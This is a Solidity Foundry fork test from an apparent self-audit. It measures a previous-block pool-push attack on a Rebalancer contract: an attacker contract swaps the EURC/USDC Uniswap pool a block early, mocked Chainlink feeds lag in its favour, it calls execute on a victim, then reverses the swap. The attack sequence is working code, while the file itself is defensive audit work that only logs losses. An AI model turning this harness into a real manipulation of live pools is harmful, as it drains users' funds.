// SPDX-License-Identifier: MIT
pragma solidity 0.8.37;

import {console} from "forge-std/Test.sol";
import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";

import {Rebalancer} from "../src/Rebalancer.sol";
import {IAggregatorV3} from "../src/interfaces/IAggregatorV3.sol";
import {IUniswapV3Pool} from "../src/interfaces/IUniswapV3Pool.sol";
import {BlockWindowForkTest, WindowAttacker} from "./BlockWindowFork.t.sol";

interface IFactoryOwner {
    function owner() external view returns (address);
}

interface IPoolOwner {
    function setFeeProtocol(uint8, uint8) external;
}

contract PrevBlockAttacker is WindowAttacker {
    function pushTo(address pool, bool zeroForOne, uint160 limit) external returns (uint256 amountIn, uint256 amountOut) {
        return _swap(pool, zeroForOne, 10_000_000e6, limit);
    }

    function swapExact(address pool, bool zeroForOne, uint256 amount) external returns (uint256, uint256) {
        return _swap(pool, zeroForOne, amount, 0);
    }
}

/// @notice Zelf-audit 2026-09-17, lead L-F (gevonden door de QuillShield oracle-checklist): push in blok N-1 (niet
///         gezien door de blokcheck), Chainlink loopt binnen zijn deviation-drempel in het voordeel van de aanvaller
///         achter, execute in blok N, push terug. Geen arbitrage tussen de blokken (worst case, zoals SCOPE §5.3).
///         Alleen de EURC/USDC-pool wordt geduwd. Alleen logs, geen asserts: een meting.
///
///         Draaien: kopieer dit bestand naar `test/` (het importeert `./BlockWindowFork.t.sol`) en run
///         `FORK_BLOCK=51425248 ~/.foundry/bin/forge test --match-contract QuillPrevBlockLagTest -vv`.
contract QuillPrevBlockLagTest is BlockWindowForkTest {
    PrevBlockAttacker internal patk;

    function setUp() public override {
        super.setUp();
        patk = new PrevBlockAttacker();
        atk = patk;
        deal(address(EURC), address(patk), 50_000_000e6);
        deal(address(USDC), address(patk), 50_000_000e6);
        deal(address(CBBTC), address(patk), 500e8);
    }

    /// @dev Fresh feeds (updatedAt = now). `favBps` > 0 moves the oracle price EURC/cbBTC in the attacker's favour:
    ///      buy -> oracle higher, sell -> oracle lower. `cbbtcBps` on cbBTC/USD, `eurcBps` on EURC/USD (opposite sign).
    function _feeds(bool isBuy, uint256 cbbtcBps, uint256 eurcBps) internal {
        vm.clearMockedCalls();
        address[2] memory feeds = [FEED_CBBTC_USD, FEED_EURC_USD];
        for (uint256 i; i < 2; i++) {
            (uint80 id, int256 answer, uint256 startedAt,, uint80 answeredIn) = IAggregatorV3(feeds[i]).latestRoundData();
            int256 lag = int256(i == 0 ? cbbtcBps : eurcBps);
            // buy: cbBTC up, EURC down; sell: cbBTC down, EURC up
            int256 sign = (i == 0) == isBuy ? int256(1) : int256(-1);
            answer = answer * (10_000 + sign * lag) / 10_000;
            vm.mockCall(
                feeds[i],
                abi.encodeWithSelector(IAggregatorV3.latestRoundData.selector),
                abi.encode(id, answer, startedAt, vm.getBlockTimestamp(), answeredIn)
            );
        }
    }

    struct Res {
        bool ok;
        bytes4 err;
        uint256 victimIn;
        uint256 victimOut;
        int256 atkValue; // attacker value change incl. LP exit, excl. reward, EURC 6 dec
    }

    function _case(bool isBuy, uint256 phiPct, uint256 cbLag, uint256 euLag, int256 pushBpsX10, uint256 corr)
        internal
        returns (Res memory res)
    {
        _feeds(isBuy, 0, 0);
        uint256 truePrice = r.quote();
        uint160 s1 = _sqrt(P1);
        int256 v0 = _value(address(patk), s1, truePrice);
        int24 tl;
        int24 tu;
        uint128 liq;
        if (phiPct > 0) {
            (, int24 t,,,,,) = IUniswapV3Pool(P1).slot0();
            tl = ((t / 10) * 10) - 200;
            tu = ((t / 10) * 10) + 200;
            liq = uint128(uint256(IUniswapV3Pool(P1).liquidity()) * phiPct / (100 - phiPct));
            patk.mint(P1, tl, tu, liq);
            _nextBlock();
            _feeds(isBuy, 0, 0);
        }
        // Block N-1: push EURC/USDC in the run's direction.
        uint256 pushOut;
        WindowAttacker.Push memory p;
        if (pushBpsX10 != 0) {
            p = _push(P1, isBuy, pushBpsX10);
            (, pushOut) = patk.pushTo(P1, p.zeroForOne, p.limit);
        }
        // Block N: execute at the top of the block, oracle lagging in the attacker's favour.
        _nextBlock();
        _feeds(isBuy, 0, 0);
        _fund(victim, isBuy, corr);
        _feeds(isBuy, cbLag, euLag);
        uint256 e0 = EURC.balanceOf(victim);
        uint256 b0 = CBBTC.balanceOf(victim);
        vm.prank(address(patk));
        try r.execute(victim, address(patk)) {
            res.ok = true;
        } catch (bytes memory reason) {
            res.err = bytes4(reason);
        }
        uint256 e1 = EURC.balanceOf(victim);
        uint256 b1 = CBBTC.balanceOf(victim);
        if (isBuy) {
            res.victimIn = e0 - e1;
            res.victimOut = b1 - b0;
        } else {
            res.victimIn = b0 - b1;
            res.victimOut = e1 - e0;
        }
        // Reverse the push in the same block.
        if (pushOut > 0) patk.swapExact(P1, !p.zeroForOne, pushOut);
        if (phiPct > 0) patk.exitLp(P1, tl, tu, liq);
        res.atkValue = _value(address(patk), s1, truePrice) - v0 - (res.ok ? int256(REWARD) : int256(0));
    }

    /// @dev Effective EURC per cbBTC (6 dec) of the victim's run.
    function _eff(bool isBuy, Res memory x) internal pure returns (uint256) {
        return isBuy ? Math.mulDiv(x.victimIn, 1e8, x.victimOut) : Math.mulDiv(x.victimOut, 1e8, x.victimIn);
    }

    function _grid(bool isBuy, uint256 phiPct, bool feeOff) internal {
        if (feeOff) {
            address o = IFactoryOwner(0x33128a8fC17869897dcE68Ed026d694621f6FDfD).owner();
            vm.startPrank(o);
            IPoolOwner(P1).setFeeProtocol(0, 0);
            IPoolOwner(P2).setFeeProtocol(0, 0);
            vm.stopPrank();
        }
        uint256 corr = 10_000e6;
        uint256[2][3] memory lags = [[uint256(0), 0], [uint256(30), 0], [uint256(30), 10]];
        int256[16] memory pushes = [int256(0), 50, 100, 150, 200, 250, 300, 400, 500, 600, 700, 800, 900, 1000, 1100, 1200];
        uint256 snap = vm.snapshotState();
        _feeds(isBuy, 0, 0);
        uint256 truePrice = r.quote();
        for (uint256 l; l < lags.length; l++) {
            vm.revertToState(snap);
            Res memory base = _case(isBuy, phiPct, lags[l][0], lags[l][1], 0, corr);
            require(base.ok, "baseline failed");
            uint256 effBase = _eff(isBuy, base);
            for (uint256 j = 1; j < pushes.length; j++) {
                vm.revertToState(snap);
                Res memory x = _case(isBuy, phiPct, lags[l][0], lags[l][1], pushes[j], corr);
                if (!x.ok) {
                    console.log(
                        string.concat(
                            "PBL,",
                            isBuy ? "buy" : "sell",
                            ",phi=",
                            vm.toString(phiPct),
                            ",feeOff=",
                            feeOff ? "1" : "0",
                            ",cbLag=",
                            vm.toString(lags[l][0]),
                            ",euLag=",
                            vm.toString(lags[l][1]),
                            ",push_bp_x10=",
                            vm.toString(pushes[j]),
                            ",REVERT=",
                            vm.toString(abi.encodePacked(x.err))
                        )
                    );
                    continue;
                }
                uint256 eff = _eff(isBuy, x);
                // victim's extra loss vs no push (same lag), bp x100
                int256 victimVsBase = isBuy
                    ? (int256(eff) - int256(effBase)) * 1e6 / int256(effBase)
                    : (int256(effBase) - int256(eff)) * 1e6 / int256(effBase);
                // victim's loss vs true (unlagged) oracle price, bp x100, excludes the 25 bp contract fee on buys? (buy: victimIn is gross incl. fee)
                int256 victimVsTrue = isBuy
                    ? (int256(eff) - int256(truePrice)) * 1e6 / int256(truePrice)
                    : (int256(truePrice) - int256(eff)) * 1e6 / int256(truePrice);
                uint256 runEurc = isBuy ? x.victimIn : Math.mulDiv(x.victimIn, truePrice, 1e8);
                int256 atkExtra = x.atkValue - base.atkValue;
                console.log(
                    string.concat(
                        "PBL,",
                        isBuy ? "buy" : "sell",
                        ",phi=",
                        vm.toString(phiPct),
                        ",feeOff=",
                        feeOff ? "1" : "0",
                        ",cbLag=",
                        vm.toString(lags[l][0]),
                        ",euLag=",
                        vm.toString(lags[l][1]),
                        ",push_bp_x10=",
                        vm.toString(pushes[j]),
                        string.concat(
                            ",run=",
                            vm.toString(runEurc),
                            ",baseRun=",
                            vm.toString(isBuy ? base.victimIn : Math.mulDiv(base.victimIn, truePrice, 1e8)),
                            ",victimExtraLoss_bpx100=",
                            vm.toString(victimVsBase),
                            ",victimVsTrue_bpx100=",
                            vm.toString(victimVsTrue),
                            ",atkExtra=",
                            vm.toString(atkExtra),
                            ",atkExtra_bpx100_of_run=",
                            vm.toString(atkExtra * 1e6 / int256(runEurc))
                        )
                    )
                );
            }
        }
        vm.revertToState(snap);
    }

    function test_quill_prevBlockLag_noLp_buy() public {
        _grid(true, 0, false);
    }

    function test_quill_prevBlockLag_noLp_sell() public {
        _grid(false, 0, false);
    }

    function test_quill_prevBlockLag_lp99_buy() public {
        _grid(true, 99, false);
    }

    function test_quill_prevBlockLag_lp99_sell() public {
        _grid(false, 99, false);
    }

    function test_quill_prevBlockLag_lp99_feeOff_buy() public {
        _grid(true, 99, true);
    }

    function test_quill_prevBlockLag_lp99_feeOff_sell() public {
        _grid(false, 99, true);
    }
}
